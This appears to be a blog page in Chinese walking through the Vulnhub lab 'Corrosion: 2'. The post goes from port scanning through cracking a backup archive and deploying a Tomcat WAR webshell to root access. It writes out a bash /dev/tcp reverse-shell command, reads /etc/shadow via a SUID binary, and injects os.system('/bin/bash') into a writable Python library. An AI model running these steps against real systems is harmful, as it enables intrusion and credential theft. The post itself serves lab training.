{"pageProps":{"postData":{"id":"VulnhubCorrosion 2","contentHtml":"<h1>Corrosion: 2</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/corrosion-2,745/\">https://www.vulnhub.com/entry/corrosion-2,745/</a></p>\n</blockquote>\n<p>提示：枚举才是神</p>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>使用nmap扫描网段类存活主机</p>\n<p>因为靶机是我最后添加的，所以靶机IP是<code>6</code> ，<code>kali</code>是<code>10</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-11 21:50 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00048</span>s latency).\nMAC Address: <span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">14</span> (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00040</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:E5:<span class=\"hljs-number\">3</span>B:<span class=\"hljs-number\">06</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00055</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">3</span>A:<span class=\"hljs-number\">6</span>B (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.10</span>\n</code></pre>\n</li>\n<li>\n<p>扫描主机开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-11 21:51 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00032</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   open  ssh\n<span class=\"hljs-number\">80</span>/tcp   open  http\n<span class=\"hljs-number\">8080</span>/tcp open  http-proxy\n</code></pre>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">8080</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-11 21:52 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00052</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp   open  ssh     OpenSSH <span class=\"hljs-number\">8.2</span>p1 Ubuntu <span class=\"hljs-number\">4</span>ubuntu0.<span class=\"hljs-number\">3</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp   open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">41</span> ((Ubuntu))\n<span class=\"hljs-number\">8080</span>/tcp open  http    Apache Tomcat <span class=\"hljs-number\">9.0</span>.<span class=\"hljs-number\">53</span>\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">3</span>A:<span class=\"hljs-number\">6</span>B (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">5</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">5.0</span> - <span class=\"hljs-number\">5.5</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">8080</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">11</span> <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">52</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00053</span>s latency).\n\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n8080/tcp open  http-proxy\n| http-enum: \n|   /backup.zip: Possible backup\n|   /examples/: Sample scripts\n|   /manager/html/upload: Apache Tomcat (401 )\n|   /manager/html: Apache Tomcat (401 )\n|_  /docs/: Potentially interesting folder\nMAC Address: 08:00:27:0A:3A:6B (Oracle VirtualBox virtual NIC)\n</span></code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<h3>80 端口</h3>\n<ol>\n<li>\n<p>访问主页是<code>Apache</code>默认页面</p>\n</li>\n<li>\n<p>扫描目录</p>\n<pre><code class=\"hljs language-python\">gobuster <span class=\"hljs-built_in\">dir</span> -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span> -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt -x php,html,<span class=\"hljs-built_in\">zip</span>\n,txt\n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>\n[+] Method:                  GET\n[+] Threads:                 <span class=\"hljs-number\">10</span>\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>\n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              php,html,<span class=\"hljs-built_in\">zip</span>,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/.html                (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">277</span>]\n/index.html           (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">10918</span>]\n/.html                (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">277</span>]\n/server-status        (Status: <span class=\"hljs-number\">403</span>) [Size: <span class=\"hljs-number\">277</span>]\nProgress: <span class=\"hljs-number\">1102800</span> / <span class=\"hljs-number\">1102805</span> (<span class=\"hljs-number\">100.00</span>%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>没扫描出什么，先放着</p>\n</li>\n</ol>\n<h3>8080 端口</h3>\n<ol>\n<li>\n<p>访问时<code>Tomcat</code>的默认页面</p>\n<p><img src=\"/post-images/VulnhubCorrosion%202/image89.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>二话不说，扫目录</p>\n<pre><code class=\"hljs language-python\">gobuster <span class=\"hljs-built_in\">dir</span> -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>:<span class=\"hljs-number\">8080</span> -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt -x php,html,<span class=\"hljs-built_in\">zip</span>,txt                                                                 <span class=\"hljs-number\">22</span>:05:<span class=\"hljs-number\">48</span> [<span class=\"hljs-number\">45</span>/<span class=\"hljs-number\">161</span>]\n===============================================================                                                                                                                                                   \nGobuster v3<span class=\"hljs-number\">.6</span>                                                                                                                                                                                                     \nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)                                                                                                                                                     \n===============================================================                                                                                                                                                   \n[+] Url:                     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>:<span class=\"hljs-number\">8080</span>                                                                                                                                                             \n[+] Method:                  GET                                                                                                                                                                                  \n[+] Threads:                 <span class=\"hljs-number\">10</span>                                                                                                                                                                                   \n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt                                                                                                                         \n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>                                                                                                                                                                                  \n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>                                                                                                                                                                         \n[+] Extensions:              php,html,<span class=\"hljs-built_in\">zip</span>,txt                                                                                                                                                                     \n[+] Timeout:                 10s                                                                                                                                                                                  \n===============================================================                                                                                                                                                   \nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode                                                                                                                                                                   \n===============================================================                                                                                                                                                   \n/docs                 (Status: <span class=\"hljs-number\">302</span>) [Size: <span class=\"hljs-number\">0</span>] [--> /docs/]                                                                                                                                                        \n/examples             (Status: <span class=\"hljs-number\">302</span>) [Size: <span class=\"hljs-number\">0</span>] [--> /examples/]                                                                                                                                                    \n/backup.<span class=\"hljs-built_in\">zip</span>           (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">33723</span>]                                                                                                                                                                 \n/readme.txt           (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">153</span>]                                                                                                                                                                   \n/manager              (Status: <span class=\"hljs-number\">302</span>) [Size: <span class=\"hljs-number\">0</span>] [--> /manager/] \n/RELEASE-NOTES.txt    (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">6898</span>]\nProgress: <span class=\"hljs-number\">1102800</span> / <span class=\"hljs-number\">1102805</span> (<span class=\"hljs-number\">100.00</span>%)                                                                    \n===============================================================                                                                                                                                                   \nFinished                                            \n=============================================================== \n</code></pre>\n<p>我已经把<code>404</code>状态码的过滤了</p>\n<ul>\n<li>\n<p><code>/docs</code> 为<code>tomcat</code>的文档</p>\n</li>\n<li>\n<p><code>/examples/</code>是<code>tomcat</code>例子</p>\n</li>\n<li>\n<p><code>/backup.zip</code> 压缩包内容应该是备份的，解压需要密码</p>\n</li>\n<li>\n<p><code>readme.txt</code> 我以为是官方文档</p>\n<pre><code class=\"hljs language-python\">Hey randy! It<span class=\"hljs-string\">'s your System Administrator. I left you a file on the server, I'</span>m sure nobody will find it.\nAlso remember to use that password I gave you.\n嘿，兰迪！我是你的系统管理员。我在服务器上给你留了一个文件，我相信没人能找到它。\n另外记得使用我给你的密码\n</code></pre>\n</li>\n<li>\n<p><code>/manager</code> 需要提供账号密码</p>\n</li>\n</ul>\n</li>\n<li>\n<p>暂时没什么线索，想尝试爆破出压缩包的密码</p>\n<ul>\n<li>\n<p>使用<code>fcrackzip</code></p>\n<pre><code class=\"hljs language-python\">crackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.<span class=\"hljs-built_in\">zip</span>\n\nPASSWORD FOUND!!!!: pw == @administrator_hi5\n</code></pre>\n<p>解出密码 <code>@administrator_hi5</code></p>\n</li>\n<li>\n<p>解压压缩包，输出破解出的密码</p>\n<pre><code class=\"hljs language-python\">unzip backup.<span class=\"hljs-built_in\">zip</span> -d backup  \nArchive:  backup.<span class=\"hljs-built_in\">zip</span>\n[backup.<span class=\"hljs-built_in\">zip</span>] catalina.policy password: \n  inflating: backup/catalina.policy  \n  inflating: backup/context.xml      \n  inflating: backup/catalina.properties  \n  inflating: backup/jaspic-providers.xml  \n  inflating: backup/jaspic-providers.xsd  \n  inflating: backup/logging.properties  \n  inflating: backup/server.xml       \n  inflating: backup/tomcat-users.xml  \n  inflating: backup/tomcat-users.xsd  \n  inflating: backup/web.xml\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>解压后发现存在<code>tomcat-users.xml</code>以及<code>tomcat-users.xsd</code> ，配置tomcat用户及其角色，通常用于管理后台的访问权限</p>\n<pre><code class=\"hljs language-python\">&#x3C;role rolename=<span class=\"hljs-string\">\"manager-gui\"</span>/>\n&#x3C;user username=<span class=\"hljs-string\">\"manager\"</span> password=<span class=\"hljs-string\">\"melehifokivai\"</span> roles=<span class=\"hljs-string\">\"manager-gui\"</span>/>\n\n&#x3C;role rolename=<span class=\"hljs-string\">\"admin-gui\"</span>/>\n&#x3C;user username=<span class=\"hljs-string\">\"admin\"</span> password=<span class=\"hljs-string\">\"melehifokivai\"</span> roles=<span class=\"hljs-string\">\"admin-gui, manager-gui\"</span>/>\n</code></pre>\n<p>的到密码<code>melehifokivai</code> ，两个用户名<code>admin</code>和<code>manager</code> ，均尝试了<code>ssh</code>登录无果</p>\n</li>\n<li>\n<p>访问<code>/manager</code> 提交得到的账号密码，成功进入使用了<code>admin</code>和<code>melehifokivai</code></p>\n<p><img src=\"/post-images/VulnhubCorrosion%202/image90.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>后台利用</h2>\n<ol>\n<li>\n<p>进入了<code>tomcat</code>的后台，涉及到<code>tomcat</code>后台的利用</p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/weixin_41924764/article/details/108196725\">https://blog.csdn.net/weixin_41924764/article/details/108196725</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/qq_43615820/article/details/116357744\">https://blog.csdn.net/qq_43615820/article/details/116357744</a> 这里使用的是JSP的一句话木马</p>\n</blockquote>\n</li>\n<li>\n<p>复制恶意代码存为文件<code>2131.jsp</code> ，并使用<code>jar</code>制作<code>war</code>包</p>\n<pre><code class=\"hljs language-python\">jar cvf <span class=\"hljs-number\">2131.</span>war <span class=\"hljs-number\">2131.j</span>sp\n</code></pre>\n</li>\n<li>\n<p>然后上传<code>war</code>包</p>\n<p><img src=\"/post-images/VulnhubCorrosion%202/image91.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>上传之后使用蚁🗡连接，测试成功</p>\n<p><img src=\"/post-images/VulnhubCorrosion%202/image92.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>使用蚁🗡虚拟终端进行反弹<code>shell</code> ，同时<code>kali</code>开启监听</p>\n<pre><code class=\"hljs language-python\">(tomcat:/<span class=\"hljs-built_in\">bin</span>/sh: ) $ bash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/192.168.56.10/1234 0>&#x26;1'</span>\n</code></pre>\n<pre><code class=\"hljs language-python\">nc -lvp <span class=\"hljs-number\">1234</span>                             \nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.10</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>] <span class=\"hljs-number\">58882</span>\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (<span class=\"hljs-number\">1277</span>): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\ntomcat@corrosion:/var/spool/cron$ \n</code></pre>\n<p>获得shell！！！</p>\n</li>\n</ol>\n<h2>提权 - tomcat用户</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">tomcat@corrosion:/var/spool/cron$ whoami\ntomcat\ntomcat@corrosion:/var/spool/cron$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">1001</span>(tomcat) gid=<span class=\"hljs-number\">1001</span>(tomcat) groups=<span class=\"hljs-number\">1001</span>(tomcat)\ntomcat@corrosion:/var/spool/cron$ uname -a\nLinux corrosion <span class=\"hljs-number\">5.11</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">34</span>-generic <span class=\"hljs-comment\">#36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>寻找敏感目录</p>\n<ul>\n<li>家目录下存在<code>jaye</code>文件夹和<code>randy</code>文件夹，其中<code>jaye</code>没有访问权限，只能看<code>randy</code>的文件夹\n<ul>\n<li>\n<p><code>note.txt</code></p>\n<pre><code class=\"hljs language-python\">tomcat@corrosion:/home/randy$ cat note.txt \nHey randy this <span class=\"hljs-keyword\">is</span> your system administrator, hope your having a great day! I just wanted to let you know\nthat I changed your permissions <span class=\"hljs-keyword\">for</span> your home directory. You won<span class=\"hljs-string\">'t be able to remove or add files for now.\n\nI will change these permissions later on.\n\nSee you next Monday randy!\n嘿 randy 我是你的系统管理员，希望你今天过得愉快！我只是想让你知道\n我更改了你的主目录的权限。你现在无法删除或添加文件。\n\n我稍后会更改这些权限。\n\n下周一见 randy！\n</span></code></pre>\n</li>\n<li>\n<p><code>randombase64.py</code></p>\n<pre><code class=\"hljs language-python\">tomcat@corrosion:/home/randy$ cat randombase64.py \n<span class=\"hljs-keyword\">import</span> base64\nmessage = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Enter your string: \"</span>)\nmessage_bytes = message.encode(<span class=\"hljs-string\">'ascii'</span>)\nbase64_bytes = base64.b64encode(message_bytes)\nbase64_message = base64_bytes.decode(<span class=\"hljs-string\">'ascii'</span>)\n<span class=\"hljs-built_in\">print</span>(base64_message)\ntomcat@corrosion:/home/randy$ \n</code></pre>\n</li>\n<li>\n<p><code>user.txt</code></p>\n<pre><code class=\"hljs language-python\">tomcat@corrosion:/home/randy$ cat user.txt\nca73a018ae6908a7d0ea5d1c269ba4b6\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>操作了一番还是没找到提权的地方，记得之前给了一串密码<code>melehifokivai</code> ，只尝试了randy的用户还有<code>jaye</code>账号的没尝试</p>\n<p>尝试在<code>jaye</code>使用<code>ssh</code>登录</p>\n<pre><code class=\"hljs language-python\">ssh jaye@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>\njaye@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span><span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n19 updates can be applied immediately.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n$ \n\n</span></code></pre>\n<p>登陆成功</p>\n</li>\n</ol>\n<h2>提权 - jaye用户</h2>\n<ol>\n<li>\n<p>寻找敏感文件</p>\n<ul>\n<li>\n<p>在家目录下存在<code>Files</code>文件夹权限是<code>root</code>的，里边存在个可执行文件<code>look</code> ，是<code>root</code>权限的，并且我们拥有执行权限，这样我们就可以使用<code>look</code>命令来读取<code>shadow</code>文件的内容了</p>\n<pre><code class=\"hljs language-python\">---s--s--x  <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">14728</span> Sep <span class=\"hljs-number\">17</span>  <span class=\"hljs-number\">2021</span> look\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>使用<code>look</code>命令读取<code>shadow</code>文件，读取<code>root</code>用户以及<code>randy</code>用户</p>\n<pre><code class=\"hljs language-python\">./look -f <span class=\"hljs-string\">\"root\"</span> /etc/shadow\nroot:$<span class=\"hljs-number\">6</span>$fHvHhNo5DWsYxgt0$<span class=\"hljs-number\">.3</span>upyGTbu9RjpoCkHfW<span class=\"hljs-number\">.1</span>F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK<span class=\"hljs-number\">.5</span>OR57.:<span class=\"hljs-number\">18888</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n./look -f <span class=\"hljs-string\">\"randy\"</span> /etc/shadow\nrandy:$<span class=\"hljs-number\">6</span>$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi<span class=\"hljs-number\">.61</span>HJ36qXGvFHJGY/:<span class=\"hljs-number\">18888</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n</code></pre>\n<p>保存为<code>pass</code>文件放到<code>john</code>进行爆破，破解了五个多小时，仅破解了<code>randy</code>用户的密码</p>\n<pre><code class=\"hljs language-python\">07051986randy (randy)\n</code></pre>\n</li>\n<li>\n<p>使用密码登录<code>ssh</code></p>\n<pre><code class=\"hljs language-python\">ssh randy@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span>\nrandy@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.6</span><span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n19 updates can be applied immediately.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n</span></code></pre>\n</li>\n</ol>\n<h2>提权 - randy用户</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">randy@corrosion:~$ sudo -l\n[sudo] password <span class=\"hljs-keyword\">for</span> randy: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> randy on corrosion:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>\n\nUser randy may run the following commands on corrosion:\n    (root) PASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/python3<span class=\"hljs-number\">.8</span> /home/randy/randombase64.py\n</code></pre>\n</li>\n<li>\n<p>查看<code>/home/randy/randombase64.py</code> 是否拥有修改权限</p>\n<pre><code class=\"hljs language-python\">-rwxr-xr-x  <span class=\"hljs-number\">1</span> root  root   <span class=\"hljs-number\">210</span> Sep <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2021</span> randombase64.py\n</code></pre>\n<p>不能直接写入命令</p>\n</li>\n<li>\n<p>我们知道它使用了base64模块，我们直接去修改base64模块</p>\n<pre><code class=\"hljs language-python\">randy@corrosion:~$ ls -al /usr/lib/python3<span class=\"hljs-number\">.8</span>/base64.py \n-rwxrwxrwx <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">20386</span> Sep <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2021</span> /usr/lib/python3<span class=\"hljs-number\">.8</span>/base64.py\n</code></pre>\n<p>刚好也拥有权限，修改文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># nano /usr/lib/python3.8/base64.py</span>\n<span class=\"hljs-keyword\">import</span> os\n....\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">b64encode</span>(<span class=\"hljs-params\">s, altchars=<span class=\"hljs-literal\">None</span></span>):\n    os.system(<span class=\"hljs-string\">\"/bin/bash\"</span>)\n</code></pre>\n<p>需要写在<code>b64encode</code> 函数里边是因为它文件（<code>randombase64.py</code>）里面调用了该函数</p>\n</li>\n<li>\n<p>执行文件<code>randombase64.py</code></p>\n<pre><code class=\"hljs language-python\">randy@corrosion:~$ sudo /usr/<span class=\"hljs-built_in\">bin</span>/python3<span class=\"hljs-number\">.8</span> /home/randy/randombase64.py\nEnter your string: <span class=\"hljs-number\">1</span>\nroot@corrosion:/home/randy<span class=\"hljs-comment\"># </span>\n</code></pre>\n<p>获得root用户！！！</p>\n</li>\n<li>\n<p>读取<code>flag</code>文件</p>\n<pre><code class=\"hljs language-python\">root@corrosion:~<span class=\"hljs-comment\"># cat root.txt</span>\n2fdbf8d4f894292361d6c72c8e833a4b\n</code></pre>\n</li>\n</ol>\n<h2>总结</h2>\n<p>学到tomcat后台提权方法，其实不止上传war方法，也可以直接使用MSF，不过使用方法是一样的，但是方便</p>\n<p>以及提权，我们可以直接使用look来读取root的flag文件的，并且在laye用户也可以使用**<code>polkit-agent-helper-1</code>** 来提权的，不过拿到root权限不是更好吗</p>","title":"Vulnhub - Corrosion 2","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"Corrosion: 2\n\n https://www.vulnhub.com/entry/corrosion-2,745/\n \n\n提示：枚举才是神\n\n主机发现端口扫描\n\n1. 使用nmap扫描网段类存活主机\n    \n    因为靶机是我最后添加的，所以靶机IP是`6` ，`kali`是`10`\n    \n    \n    \n2. 扫描主机开放端口\n    \n    \n    \n3. 扫描主机服务..."},"recentPosts":[{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"}]},"__N_SSG":true}